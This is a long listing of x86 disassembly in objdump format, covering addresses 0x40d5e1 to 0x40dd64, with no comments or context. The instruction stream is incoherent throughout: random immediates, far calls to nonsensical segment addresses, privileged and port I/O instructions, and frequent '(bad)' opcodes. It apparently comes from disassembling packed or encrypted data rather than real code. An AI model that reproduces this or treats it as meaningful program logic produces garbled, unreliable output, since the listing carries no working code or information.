  40d5e1:	pop    esp
  40d5e2:	mov    ds:0x2509c99a,eax
  40d5e7:	dec    esp
  40d5e8:	xor    bl,BYTE PTR [eax]
  40d5ea:	sbb    DWORD PTR [ebx],esp
  40d5ec:	jno    0x40d576
  40d5ee:	stc    
  40d5ef:	fstp   DWORD PTR [edi-0x584fba9]
  40d5f5:	pop    ds
  40d5f6:	in     al,dx
  40d5f7:	xor    BYTE PTR [edi+0x28],0x15
  40d5fb:	xor    bl,BYTE PTR [ecx+0x39d70fd6]
  40d601:	mov    ds:0xd7e6719a,eax
  40d606:	popf   
  40d607:	clc    
  40d608:	inc    esi
  40d609:	dec    esp
  40d60a:	fcmovnb st,st(4)
  40d60c:	test   DWORD PTR [ebx-0x24],edi
  40d60f:	inc    esi
  40d610:	cli    
  40d611:	lods   eax,DWORD PTR ds:[esi]
  40d612:	sub    DWORD PTR [ecx],0xfbec9494
  40d618:	dec    edi
  40d619:	push   ecx
  40d61a:	fisub  WORD PTR [esp+edx*8+0x24]
  40d61e:	out    0x69,eax
  40d620:	xor    BYTE PTR [ebx+edi*4],cl
  40d623:	xchg   ecx,eax
  40d624:	cmp    ebp,DWORD PTR [ebp-0x47]
  40d627:	pop    esp
  40d628:	dec    esi
  40d629:	icebp  
  40d62a:	jb     0x40d690
  40d62c:	xor    al,0xcb
  40d62e:	loop   0x40d666
  40d630:	mov    ecx,0xd6d58de0
  40d635:	dec    esp
  40d636:	xor    dl,BYTE PTR [eax]
  40d638:	xor    al,0xa6
  40d63a:	ja     0x40d6b5
  40d63c:	outs   dx,BYTE PTR ds:[esi]
  40d63d:	stos   BYTE PTR es:[edi],al
  40d63e:	neg    DWORD PTR fs:[ebx-0x32abaf40]
  40d645:	arpl   bx,si
  40d647:	sub    BYTE PTR [ebx+0x18],cl
  40d64a:	pop    esi
  40d64b:	sar    DWORD PTR [edx+0x2b979c0a],1
  40d651:	jle    0x40d6cd
  40d653:	idiv   BYTE PTR [ebp-0x445c023c]
  40d659:	add    BYTE PTR [ebx-0xa],al
  40d65c:	pusha  
  40d65d:	push   eax
  40d65e:	imul   ebx,DWORD PTR [ecx],0xdf0fec53
  40d664:	jg     0x40d614
  40d666:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d667:	cld    
  40d668:	dec    ecx
  40d669:	rcr    DWORD PTR [ecx-0x243fd095],0x5c
  40d670:	mov    al,ds:0x3942e85c
  40d675:	fwait
  40d676:	cli    
  40d677:	retf   
  40d678:	push   cs
  40d679:	push   0xb56b58b9
  40d67e:	into   
  40d67f:	inc    esp
  40d680:	push   0xffffffd3
  40d682:	sbb    al,0xfa
  40d684:	dec    esp
  40d685:	imul   ecx,DWORD PTR gs:[ebp-0x5c0019e8],0xffffffd5
  40d68d:	mov    gs,WORD PTR [ecx-0x45]
  40d690:	fisttp DWORD PTR [eax-0x1e]
  40d693:	dec    edx
  40d694:	xor    eax,0xc1ec3c86
  40d699:	ins    DWORD PTR es:[edi],dx
  40d69a:	mov    BYTE PTR [edi-0x5d],ch
  40d69d:	daa    
  40d69e:	addr16 aas 
  40d6a0:	xchg   esi,eax
  40d6a1:	dec    ecx
  40d6a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d6a3:	fs jo  0x40d6c0
  40d6a6:	cmp    edi,ebp
  40d6a8:	cmp    bl,0xf
  40d6ab:	ret    0x2b0d
  40d6ae:	out    0x60,al
  40d6b0:	cmp    bh,BYTE PTR ds:0x1dca7c90
  40d6b6:	lods   eax,DWORD PTR ds:[esi]
  40d6b7:	fucom  st(3)
  40d6b9:	push   ss
  40d6ba:	dec    edi
  40d6bb:	add    al,0x3f
  40d6bd:	popf   
  40d6be:	mov    dh,0xc6
  40d6c0:	call   0x5c75:0x75b8451
  40d6c7:	retf   
  40d6c8:	(bad)  
  40d6c9:	sar    BYTE PTR [ecx-0x417eb00c],cl
  40d6cf:	ins    BYTE PTR es:[edi],dx
  40d6d0:	jne    0x40d6d1
  40d6d2:	mov    eax,ds:0x4d1aea86
  40d6d7:	xor    BYTE PTR [edi-0x31],0xae
  40d6db:	imul   ebp,DWORD PTR [edi+0x7793e970],0x6970c5e1
  40d6e5:	aad    0xd2
  40d6e7:	mov    esi,0x173ab791
  40d6ec:	jmp    0xfab5822c
  40d6f1:	sub    ebx,ecx
  40d6f3:	mov    bh,0x33
  40d6f5:	lock push cs
  40d6f7:	cmp    BYTE PTR [eax-0x66b9a8c4],dl
  40d6fd:	lahf   
  40d6fe:	dec    ebx
  40d6ff:	in     eax,dx
  40d700:	mov    ecx,esi
  40d702:	mov    eax,ds:0x29d1109e
  40d707:	and    BYTE PTR [ecx],al
  40d709:	xor    DWORD PTR [eax+0x4fa3e1c5],edi
  40d70f:	rcr    esi,0xb
  40d712:	test   al,0xc1
  40d714:	inc    esp
  40d715:	mov    edi,0x7117b171
  40d71a:	std    
  40d71b:	mov    al,ds:0x6d59fe5f
  40d720:	ja     0x40d703
  40d722:	sub    ebp,DWORD PTR [esp+edx*2+0x16]
  40d726:	push   ebx
  40d727:	mov    esp,DWORD PTR [esi+0xd]
  40d72a:	sbb    DWORD PTR [esi+0x61],ebp
  40d72d:	sar    BYTE PTR [ebp-0x36533ebc],cl
  40d733:	jns    0x40d6d2
  40d735:	and    al,0xd8
  40d737:	dec    eax
  40d738:	push   edx
  40d739:	push   edi
  40d73a:	sub    edx,edi
  40d73c:	xor    al,0x63
  40d73e:	fbstp  TBYTE PTR [eax+ebp*4-0x64]
  40d742:	mov    bh,0x2e
  40d744:	fldenv [ebx]
  40d746:	neg    ebp
  40d748:	outs   dx,DWORD PTR ds:[esi]
  40d749:	push   ecx
  40d74a:	pusha  
  40d74b:	(bad)  
  40d74d:	lods   eax,DWORD PTR ds:[esi]
  40d74e:	adc    esp,ebx
  40d750:	xor    DWORD PTR [eax+edi*1],0xffffffd5
  40d754:	inc    ebx
  40d755:	xor    BYTE PTR [ecx+esi*4-0x27],dh
  40d759:	test   DWORD PTR [eax+0x7ca61d15],ebp
  40d75f:	jno    0x40d6e5
  40d761:	or     edx,eax
  40d763:	addr16 adc al,0x1c
  40d766:	xchg   ebp,eax
  40d767:	push   eax
  40d768:	lahf   
  40d769:	rol    DWORD PTR [eax+0x3d],0xf9
  40d76d:	mov    ds:0xf67fbecb,eax
  40d772:	call   0x2f44:0xda811c39
  40d779:	and    eax,0x8d21ef89
  40d77e:	(bad)  
  40d77f:	push   ebx
  40d780:	and    al,0x58
  40d782:	sar    BYTE PTR [ebx-0x5f],1
  40d785:	daa    
  40d786:	adc    eax,0x2f304910
  40d78b:	mov    BYTE PTR [edx],ch
  40d78d:	mov    ebx,0x13a6cca6
  40d792:	repz jge 0x40d750
  40d795:	push   edi
  40d796:	pop    ebp
  40d797:	cs inc eax
  40d799:	cmp    esi,DWORD PTR [edx+0x19]
  40d79c:	shl    DWORD PTR ds:0xa24e309f,0x38
  40d7a3:	mov    ah,0x33
  40d7a5:	ss xchg edi,eax
  40d7a7:	sbb    BYTE PTR [edx-0x545159d9],0x6b
  40d7ae:	jb     0x40d731
  40d7b0:	adc    al,0x5e
  40d7b2:	test   BYTE PTR [edx-0x13bf7eea],ah
  40d7b8:	xor    ebx,ebp
  40d7ba:	adc    al,0xf9
  40d7bc:	add    BYTE PTR [edi-0x38a15d2a],0xcc
  40d7c3:	fwait
  40d7c4:	add    al,0x19
  40d7c6:	(bad)  
  40d7c7:	iret   
  40d7c8:	xlat   BYTE PTR ds:[ebx]
  40d7c9:	shr    BYTE PTR [ebx+0x49],0xd8
  40d7cd:	adc    eax,0x2c982f8e
  40d7d2:	jmp    0x40d7bb
  40d7d4:	outs   dx,BYTE PTR fs:[esi]
  40d7d6:	add    ch,BYTE PTR [ebp+esi*8-0x2002e624]
  40d7dd:	in     al,dx
  40d7de:	mov    esi,0xdeae7896
  40d7e3:	xchg   BYTE PTR [edi],dl
  40d7e5:	(bad)  
  40d7e6:	iret   
  40d7e7:	mov    ds:0x7924ec03,eax
  40d7ec:	test   al,al
  40d7ee:	dec    ebp
  40d7ef:	inc    eax
  40d7f0:	and    BYTE PTR fs:[ebx],ah
  40d7f3:	cdq    
  40d7f4:	ins    DWORD PTR es:[edi],dx
  40d7f5:	loope  0x40d86f
  40d7f7:	dec    esi
  40d7f8:	cmp    DWORD PTR [eax],0xc
  40d7fb:	jp     0x40d788
  40d7fd:	adc    edx,DWORD PTR [ebx+0x76da957a]
  40d803:	push   ds
  40d804:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d805:	fmul   QWORD PTR [ecx+0x17b967ed]
  40d80b:	pop    ds
  40d80c:	push   ebp
  40d80d:	mov    ecx,0x37d85408
  40d812:	rol    BYTE PTR [esi-0x68],1
  40d815:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d816:	outs   dx,DWORD PTR ds:[esi]
  40d817:	(bad)
  40d81a:	dec    esi
  40d81b:	or     ecx,DWORD PTR [edi+0x34]
  40d81e:	loopne 0x40d894
  40d820:	clc    
  40d821:	xchg   edx,eax
  40d822:	adc    BYTE PTR [edi],bh
  40d824:	or     BYTE PTR [edi+0x5aa269c4],dh
  40d82a:	xor    BYTE PTR [esi],dh
  40d82c:	cvtpi2ps xmm3,QWORD PTR [esi]
  40d82f:	adc    ch,BYTE PTR [ecx-0x3064b0fd]
  40d835:	inc    edi
  40d836:	adc    DWORD PTR [edx+0x73828ea4],eax
  40d83c:	lea    ecx,[ecx]
  40d83e:	cli    
  40d83f:	mov    ebx,0x6c69054c
  40d844:	xlat   BYTE PTR ds:[ebx]
  40d845:	ja     0x40d7e1
  40d847:	and    eax,0x9b6723df
  40d84c:	push   0x5f44dd8c
  40d851:	add    DWORD PTR [edx],edi
  40d853:	repnz hlt 
  40d855:	push   esi
  40d856:	ss out dx,al
  40d858:	(bad)  
  40d859:	or     dl,dh
  40d85b:	add    esp,DWORD PTR [eax]
  40d85d:	out    0x44,al
  40d85f:	test   DWORD PTR [ecx+0x1cb973a3],0xa935321a
  40d869:	aam    0x8d
  40d86b:	pushf  
  40d86c:	sbb    cl,BYTE PTR [eax-0x7b]
  40d86f:	in     eax,0xbd
  40d871:	cmp    ch,BYTE PTR [edx]
  40d873:	imul   edi,DWORD PTR [ebx+ebp*1+0x32],0xffffffc4
  40d878:	icebp  
  40d879:	jecxz  0x40d87c
  40d87b:	sub    BYTE PTR [si],dl
  40d87e:	xor    ch,BYTE PTR [eax-0x1c]
  40d881:	aas    
  40d882:	mov    ebp,0xe9753251
  40d887:	sub    eax,eax
  40d889:	mov    edi,0xdf128731
  40d88e:	jbe    0x40d904
  40d890:	pop    ebp
  40d891:	pop    esp
  40d892:	comiss xmm6,DWORD PTR [edi+0x679331e9]
  40d899:	pushf  
  40d89a:	xchg   ebp,eax
  40d89b:	loope  0x40d86a
  40d89d:	xchg   BYTE PTR [esi+0x76],bh
  40d8a0:	(bad)  
  40d8a1:	in     al,0xdf
  40d8a3:	icebp  
  40d8a4:	push   ecx
  40d8a5:	xchg   edi,eax
  40d8a6:	fistp  QWORD PTR [edi+ecx*1-0x1272541]
  40d8ad:	out    0x50,eax
  40d8af:	xchg   DWORD PTR [ebx],ebp
  40d8b1:	outs   dx,DWORD PTR ds:[esi]
  40d8b2:	cmp    cl,BYTE PTR [eax+ebp*4]
  40d8b5:	adc    al,BYTE PTR [ebx+0x7c]
  40d8b8:	push   ebx
  40d8b9:	or     BYTE PTR [edi-0x4565ab85],dl
  40d8bf:	mov    DWORD PTR [edi],0xeed03c0d
  40d8c5:	shl    BYTE PTR [ecx+0x20],1
  40d8c8:	ficom  DWORD PTR [esi]
  40d8ca:	cmp    eax,0x197ef06b
  40d8cf:	sbb    eax,edx
  40d8d1:	cmp    BYTE PTR [ebx],bl
  40d8d3:	aam    0x7e
  40d8d5:	inc    ecx
  40d8d6:	jae    0x40d910
  40d8d8:	add    al,0xf4
  40d8da:	call   0xa16b:0x121296da
  40d8e1:	jns    0x40d8f9
  40d8e3:	sbb    al,0x1
  40d8e5:	adc    ebp,ebp
  40d8e7:	xchg   DWORD PTR [esi-0x3cbda055],ebp
  40d8ed:	in     al,0x7
  40d8ef:	cli    
  40d8f0:	pop    edx
  40d8f1:	stos   DWORD PTR es:[edi],eax
  40d8f2:	loopne 0x40d8e3
  40d8f4:	out    dx,eax
  40d8f5:	or     eax,0x8c2c1b44
  40d8fa:	out    dx,eax
  40d8fb:	push   ds
  40d8fc:	cmc    
  40d8fd:	mov    esp,0xc980af5e
  40d902:	cmovo  eax,edi
  40d905:	add    ebx,DWORD PTR ss:[eax]
  40d908:	push   0x3e4987ec
  40d90d:	test   BYTE PTR [esi+0x0],bh
  40d910:	ret    0x7583
  40d913:	ins    DWORD PTR es:[edi],dx
  40d914:	inc    ebx
  40d915:	aaa    
  40d916:	hlt    
  40d917:	jg     0x40d8f8
  40d919:	ror    edi,0xf9
  40d91c:	sub    DWORD PTR [eax],edx
  40d91e:	test   eax,0xe6787a52
  40d923:	xor    BYTE PTR [esi],al
  40d925:	mov    dl,0xa6
  40d927:	loopne 0x40d97f
  40d929:	pop    edx
  40d92a:	push   cs
  40d92b:	add    dl,BYTE PTR [ecx]
  40d92d:	js     0x40d8fd
  40d92f:	adc    al,0xac
  40d931:	cmp    eax,0x5b82abb4
  40d936:	inc    edi
  40d937:	rol    DWORD PTR [ecx+0x1294cbd0],0x8c
  40d93e:	add    esp,ebp
  40d940:	sub    al,0x2f
  40d942:	adc    ah,bl
  40d944:	pop    esi
  40d945:	cli    
  40d946:	imul   ebx,DWORD PTR [ecx+edi*2],0x470e0529
  40d94d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d94e:	sub    eax,0x841c91c6
  40d953:	(bad)  
  40d955:	xor    ebp,DWORD PTR [ebp-0x3]
  40d958:	mov    dl,0x2b
  40d95a:	and    eax,0xfbf7bc61
  40d95f:	dec    edx
  40d960:	call   0x4739:0x756277dc
  40d967:	pusha  
  40d968:	xchg   DWORD PTR [ebp-0x113d704f],ecx
  40d96e:	mov    eax,ds:0x80901e78
  40d973:	or     DWORD PTR [ebp-0x49],esi
  40d976:	pop    esp
  40d977:	fdivr  QWORD PTR [ebx]
  40d979:	aas    
  40d97a:	inc    bh
  40d97c:	pop    ebp
  40d97d:	add    DWORD PTR [edx+esi*4+0x6efa4e7c],esp
  40d984:	mov    edi,0xd582d1b0
  40d989:	fldcw  WORD PTR [edi]
  40d98b:	(bad)  
  40d98c:	jmp    0xe44c098f
  40d991:	addr16 cmc 
  40d993:	pop    ecx
  40d994:	mov    eax,ds:0xd09319c5
  40d999:	out    dx,al
  40d99a:	jb     0x40d983
  40d99c:	xor    DWORD PTR [edi-0x37],esi
  40d99f:	mov    edi,ds
  40d9a1:	repz pusha 
  40d9a3:	adc    al,0x4d
  40d9a5:	repnz adc edx,DWORD PTR es:[edi]
  40d9a9:	(bad)  
  40d9aa:	mov    cl,0x84
  40d9ac:	jne    0x40d96f
  40d9ae:	rcl    ebp,0x4e
  40d9b1:	loope  0x40d9ae
  40d9b3:	dec    edx
  40d9b4:	push   0xffffff93
  40d9b6:	test   al,0xd6
  40d9b8:	and    cl,BYTE PTR [ebx-0x7b]
  40d9bb:	fisttp DWORD PTR [edi+0xb031743]
  40d9c1:	jg     0x40d9d9
  40d9c3:	test   BYTE PTR [ebx+0x55],ah
  40d9c6:	xchg   ebp,eax
  40d9c7:	cmc    
  40d9c8:	cmp    BYTE PTR [esi],al
  40d9ca:	lock ret 
  40d9cc:	cdq    
  40d9cd:	jg     0x40d9c1
  40d9cf:	mov    ebx,0x7c5fee52
  40d9d4:	sub    BYTE PTR [ecx-0x417c3ce7],al
  40d9da:	int3   
  40d9db:	loopne 0x40d9c4
  40d9dd:	aad    0x56
  40d9df:	cdq    
  40d9e0:	xchg   edi,eax
  40d9e1:	mov    dl,0xce
  40d9e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9e4:	loopne 0x40da4d
  40d9e6:	dec    ecx
  40d9e7:	mov    al,ch
  40d9e9:	jmp    0xe896:0x54d4b0b
  40d9f0:	loop   0x40d98c
  40d9f2:	inc    edx
  40d9f3:	push   es
  40d9f4:	inc    ebp
  40d9f5:	sbb    al,0x84
  40d9f7:	cmp    BYTE PTR [ebp-0x75694f4f],cl
  40d9fd:	mov    dl,0x52
  40d9ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da00:	sti    
  40da01:	dec    esp
  40da02:	lea    ebx,[ecx]
  40da04:	cwde   
  40da05:	call   0x75a8:0x859b9dc0
  40da0c:	mov    esi,gs
  40da0e:	mov    eax,0xb99799a5
  40da13:	ds jl  0x40da81
  40da16:	mov    dl,0x22
  40da18:	inc    ecx
  40da19:	pop    eax
  40da1a:	aam    0xe8
  40da1c:	ins    DWORD PTR es:[edi],dx
  40da1d:	popf   
  40da1e:	out    0xb0,eax
  40da20:	popa   
  40da21:	rol    DWORD PTR [ecx],cl
  40da23:	pop    edx
  40da24:	ret    
  40da25:	jnp    0x40da7c
  40da27:	jp     0x40d9bb
  40da29:	and    bl,BYTE PTR [ebp-0x4242245c]
  40da2f:	gs mov ebp,0xaf1307b5
  40da35:	popf   
  40da36:	test   al,0x3a
  40da38:	fbstp  TBYTE PTR [edi+esi*2-0x7a]
  40da3c:	or     ecx,DWORD PTR [esp+ebp*2-0x26cad185]
  40da43:	add    eax,0xb8c853c2
  40da48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da49:	iret   
  40da4a:	pop    esi
  40da4b:	or     BYTE PTR [ecx],0x95
  40da4e:	(bad)  
  40da4f:	fist   DWORD PTR [ecx+0x7c5ff92a]
  40da55:	jg     0x40da18
  40da57:	adc    bl,0x5f
  40da5a:	jo     0x40da51
  40da5c:	pop    esi
  40da5d:	pop    edx
  40da5e:	pop    edi
  40da5f:	enter  0xe495,0x40
  40da63:	jo     0x40dab8
  40da65:	push   ebx
  40da66:	aad    0x90
  40da68:	mov    bl,0xec
  40da6a:	dec    esp
  40da6b:	jmp    0x40daa7
  40da6d:	pop    edx
  40da6e:	mov    WORD PTR [edi+0x19],es
  40da71:	sub    DWORD PTR [eax-0x4ef599a],0x3fa8fb53
  40da7b:	push   ebp
  40da7c:	mov    edi,0xd4c3bcaa
  40da81:	ret    0xadf0
  40da84:	push   es
  40da85:	ja     0x40db02
  40da87:	add    al,BYTE PTR [ebx+0x78140c92]
  40da8d:	scas   eax,DWORD PTR es:[edi]
  40da8e:	imul   esp,DWORD PTR [ecx],0xffffff8d
  40da91:	add    ebp,DWORD PTR [eax+0x62]
  40da94:	(bad)  
  40da95:	mov    ecx,esp
  40da97:	loopne 0x40da38
  40da99:	xchg   edx,eax
  40da9a:	adc    DWORD PTR [ebp+0x25],0xb0133f6d
  40daa1:	cld    
  40daa2:	in     eax,dx
  40daa3:	mov    ebp,0x5265247c
  40daa8:	inc    cx
  40daab:	in     eax,0x0
  40daad:	sub    BYTE PTR [edi+0x62],ch
  40dab0:	scas   al,BYTE PTR es:[edi]
  40dab1:	xor    DWORD PTR gs:[ecx-0x1e],eax
  40dab5:	std    
  40dab6:	popf   
  40dab7:	psubd  mm3,QWORD PTR [edi]
  40daba:	popf   
  40dabb:	and    al,0x73
  40dabd:	cdq    
  40dabe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dabf:	fisubr DWORD PTR ds:0xdd204c26
  40dac5:	out    dx,al
  40dac6:	jmp    0x1ab6811b
  40dacb:	call   0xae9c:0xafe9bd4b
  40dad2:	leave  
  40dad3:	mov    esi,0x6c67286e
  40dad8:	(bad)  [eax]
  40dada:	icebp  
  40dadb:	adc    BYTE PTR [eax],cl
  40dadd:	mov    dh,0xcb
  40dadf:	test   DWORD PTR [eax-0x7347c916],ebx
  40dae5:	shl    DWORD PTR [edi],cl
  40dae7:	stos   DWORD PTR es:[edi],eax
  40dae8:	gs push ebx
  40daea:	not    dh
  40daec:	es xchg esi,eax
  40daee:	inc    edx
  40daef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40daf0:	and    ebp,esi
  40daf2:	jno    0x40db11
  40daf4:	in     eax,0xf3
  40daf6:	das    
  40daf7:	addr16 mov al,0x64
  40dafa:	loopne 0x40daab
  40dafc:	adc    ecx,DWORD PTR [eax]
  40dafe:	mov    ecx,0xae76501b
  40db03:	iret   
  40db04:	fstp   TBYTE PTR [edx]
  40db06:	sbb    eax,0xfd8a4bd0
  40db0b:	jmp    0x40db12
  40db0d:	sbb    BYTE PTR [ebp-0x65],0x35
  40db11:	push   0xf389c023
  40db16:	(bad)  
  40db17:	fnsave [esi]
  40db19:	push   esi
  40db1a:	jge    0x40dab4
  40db1c:	push   cs
  40db1d:	fst    QWORD PTR [ebx+0x4e419f4d]
  40db23:	jmp    0xb5fb7c70
  40db28:	pusha  
  40db29:	and    ch,BYTE PTR [ebx+0x26d7064e]
  40db2f:	sbb    edi,0x6c1d064d
  40db35:	xchg   BYTE PTR [ecx-0x22],ah
  40db38:	out    dx,eax
  40db39:	nop
  40db3a:	push   edi
  40db3b:	jl     0x40db69
  40db3d:	gs jmp 0xa2f4b9a
  40db43:	ins    BYTE PTR es:[edi],dx
  40db44:	inc    eax
  40db45:	jae    0x40db19
  40db47:	and    ebx,DWORD PTR [edi]
  40db49:	popa   
  40db4a:	push   ecx
  40db4b:	(bad)  
  40db4c:	sahf   
  40db4d:	aaa    
  40db4e:	bound  ebp,QWORD PTR [ebx]
  40db50:	xchg   edi,eax
  40db51:	jmp    0x40db97
  40db53:	ret    
  40db54:	mov    cl,0x4f
  40db56:	dec    edx
  40db57:	inc    ebx
  40db58:	and    eax,eax
  40db5a:	xor    BYTE PTR [esi-0x3c72e28],al
  40db60:	or     bl,dh
  40db62:	ror    ah,cl
  40db64:	jno    0x40db5a
  40db66:	cdq    
  40db67:	sub    ebp,esp
  40db69:	or     DWORD PTR [eax+0x36],esp
  40db6c:	adc    edx,DWORD PTR [eax-0x1061680e]
  40db72:	xchg   edx,eax
  40db73:	dec    edi
  40db74:	dec    ebx
  40db75:	or     ebp,DWORD PTR [esi+0x4b0a79d9]
  40db7b:	lds    ebp,FWORD PTR [eax-0x17]
  40db7e:	lds    esi,FWORD PTR [eax-0x14]
  40db81:	or     dh,cl
  40db83:	into   
  40db84:	cdq    
  40db85:	popf   
  40db86:	pop    es
  40db87:	in     eax,dx
  40db88:	adc    al,0xaa
  40db8a:	mov    ebx,0x545a41e9
  40db8f:	(bad)  
  40db90:	xlat   BYTE PTR ds:[ebx]
  40db91:	int3   
  40db92:	sti    
  40db93:	and    BYTE PTR [edx-0x3d8678b6],bh
  40db99:	xchg   edi,eax
  40db9a:	addr16 fsub st,st(3)
  40db9d:	dec    ebp
  40db9e:	push   cs
  40db9f:	imul   edx,eax,0xf01f20d3
  40dba5:	add    ah,BYTE PTR [ecx+0x4d]
  40dba8:	enter  0xf3af,0xe
  40dbac:	xor    BYTE PTR [esi],dl
  40dbae:	push   ecx
  40dbaf:	lock mul DWORD PTR [eax+0x323da30]
  40dbb6:	imul   eax,DWORD PTR [ebx],0xdad89cad
  40dbbc:	mov    eax,0x6c61babc
  40dbc1:	jle    0x40dc02
  40dbc3:	cmp    eax,0x2f25323a
  40dbc8:	add    dh,BYTE PTR [ebp-0x4b8a4ab3]
  40dbce:	test   BYTE PTR [ebx+0x6bdd40cb],bh
  40dbd4:	xor    BYTE PTR [edi+0x67],ch
  40dbd7:	shl    edi,cl
  40dbd9:	repz cs out dx,eax
  40dbdc:	sahf   
  40dbdd:	pop    ebp
  40dbde:	jecxz  0x40dba9
  40dbe0:	adc    dh,ch
  40dbe2:	mov    ch,0x22
  40dbe4:	test   eax,0x381c080f
  40dbe9:	jbe    0x40db77
  40dbeb:	pop    es
  40dbec:	mov    ds:0xcc7cb634,al
  40dbf1:	or     BYTE PTR [esi+esi*1-0x31],dl
  40dbf5:	les    edi,FWORD PTR [eax+0x48]
  40dbf8:	xlat   BYTE PTR ds:[ebx]
  40dbf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbfa:	or     eax,0xffffff86
  40dbfd:	test   DWORD PTR [ebp+0x1b],esi
  40dc00:	mov    eax,0xce8c63c2
  40dc05:	xchg   esi,eax
  40dc06:	scas   al,BYTE PTR es:[edi]
  40dc07:	push   ss
  40dc08:	pop    edi
  40dc09:	mov    esi,0x4c307413
  40dc0e:	push   ss
  40dc0f:	push   ebx
  40dc10:	jmp    0x40dbf7
  40dc12:	aam    0x26
  40dc14:	sub    eax,0xf776bddd
  40dc19:	rcr    DWORD PTR [ebx+0x37e5ce5f],cl
  40dc1f:	jnp    0x40dc1a
  40dc21:	dec    ebp
  40dc22:	nop
  40dc23:	jmp    0x98fe:0xc62e2f9d
  40dc2a:	xchg   ebp,eax
  40dc2b:	mov    cl,0x2c
  40dc2d:	xor    DWORD PTR [edx+0x39],esi
  40dc30:	inc    ebx
  40dc31:	popa   
  40dc32:	cli    
  40dc33:	imul   eax,DWORD PTR [edi],0xffffffa3
  40dc36:	(bad)  
  40dc38:	pusha  
  40dc39:	nop
  40dc3a:	test   eax,0xd9012af2
  40dc3f:	in     eax,dx
  40dc40:	iret   
  40dc41:	pop    edx
  40dc42:	sbb    ecx,DWORD PTR [ecx]
  40dc44:	jae    0x40dc1a
  40dc46:	jno    0x40dbf7
  40dc48:	inc    ebx
  40dc49:	stc    
  40dc4a:	jns    0x40dc8b
  40dc4c:	shl    bl,1
  40dc4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc4f:	lods   eax,DWORD PTR es:[esi]
  40dc51:	test   eax,0x9d4f910
  40dc56:	(bad)  
  40dc57:	pop    ecx
  40dc58:	push   eax
  40dc59:	fistp  WORD PTR ss:[esi+0x77699b2b]
  40dc60:	popa   
  40dc61:	or     bl,0x3a
  40dc64:	dec    ebp
  40dc65:	pop    edi
  40dc66:	xchg   ecx,eax
  40dc67:	mov    ds:0x1d7a592d,eax
  40dc6c:	or     DWORD PTR [edx+0x5d],esp
  40dc6f:	cmp    DWORD PTR [ecx-0x56],eax
  40dc72:	adc    eax,ebp
  40dc74:	stc    
  40dc75:	xor    dh,BYTE PTR [ebx]
  40dc77:	fsub   QWORD PTR [ebp+0x653abc3f]
  40dc7d:	sub    eax,0x110e63b7
  40dc82:	sbb    BYTE PTR [ebp+0x1c2a1841],cl
  40dc88:	add    DWORD PTR [esi+ebp*2-0x3b],esp
  40dc8c:	xchg   DWORD PTR [ecx+0x2b35dbe3],edi
  40dc92:	push   esp
  40dc93:	sub    DWORD PTR [edi+0x79ba49bf],edx
  40dc99:	in     al,0x5f
  40dc9b:	call   0xeb36:0xef9ce719
  40dca2:	push   ecx
  40dca3:	inc    esp
  40dca5:	mov    esp,0x4b26d79f
  40dcaa:	push   eax
  40dcab:	cmp    ebp,DWORD PTR [ebp+esi*1+0x190eaa46]
  40dcb2:	jo     0x40dc55
  40dcb4:	rol    ch,1
  40dcb6:	and    bh,BYTE PTR [ebx+0x57d7ea3f]
  40dcbc:	hlt    
  40dcbd:	fwait
  40dcbe:	popf   
  40dcbf:	ins    DWORD PTR es:[edi],dx
  40dcc0:	cmp    DWORD PTR [ebp+esi*1-0xb],ecx
  40dcc4:	and    BYTE PTR [eax+ecx*4],cl
  40dcc7:	mov    dh,0xcc
  40dcc9:	sub    al,0x7a
  40dccb:	unpckhps xmm4,xmm3
  40dcce:	nop
  40dccf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dcd0:	jmp    DWORD PTR [edi]
  40dcd2:	xor    bl,BYTE PTR [ebx+0x646cdd4b]
  40dcd8:	int    0x9
  40dcda:	mov    eax,0x63d42783
  40dcdf:	xchg   ebp,eax
  40dce0:	xor    eax,0x83da8716
  40dce5:	adc    esi,DWORD PTR [eax]
  40dce7:	sub    al,0x8b
  40dce9:	ficomp DWORD PTR [ebp-0x5dd97e33]
  40dcef:	jmp    0x40dd06
  40dcf1:	xor    eax,esi
  40dcf3:	push   esp
  40dcf4:	xchg   ebx,eax
  40dcf5:	call   0x1765:0x3396be8a
  40dcfc:	push   ss
  40dcfd:	retf   0xe4d0
  40dd00:	call   0xbd76:0x85e401db
  40dd07:	sysret 
  40dd09:	mov    esi,DWORD PTR [edi+ebx*8]
  40dd0c:	xchg   ebx,eax
  40dd0d:	or     dl,al
  40dd0f:	mov    BYTE PTR [esi+0x61],0xab
  40dd13:	in     al,dx
  40dd14:	int    0xc4
  40dd16:	mov    ebp,0x13b21c1d
  40dd1b:	xor    BYTE PTR [ebx+eax*2-0xf],ah
  40dd1f:	sub    eax,0xd132a1af
  40dd24:	xor    al,0xc2
  40dd26:	and    al,0xa2
  40dd28:	add    BYTE PTR [eax-0x49],bl
  40dd2b:	mov    ebx,0xf883b1af
  40dd30:	mov    esi,ecx
  40dd32:	mov    edx,DWORD PTR [esi+0x17]
  40dd35:	dec    edi
  40dd36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd37:	popa   
  40dd38:	pusha  
  40dd39:	xor    DWORD PTR [ebp+0x7a],esi
  40dd3c:	into   
  40dd3d:	ds pop ebx
  40dd3f:	sti    
  40dd40:	jo     0x40dce9
  40dd42:	frstor [ecx]
  40dd44:	fxtract 
  40dd46:	call   0x534b:0xcc87c06c
  40dd4d:	les    esi,FWORD PTR [eax]
  40dd4f:	pop    ebp
  40dd50:	jo     0x40dce7
  40dd52:	cmp    DWORD PTR [ebp-0x5b151bf1],esp
  40dd58:	and    eax,0x62bf1fb0
  40dd5d:	jmp    0x29856f76
  40dd62:	inc    ecx
  40dd63:	outs   dx,DWORD PTR ds:[esi]
  40dd64:	mov    ch,al
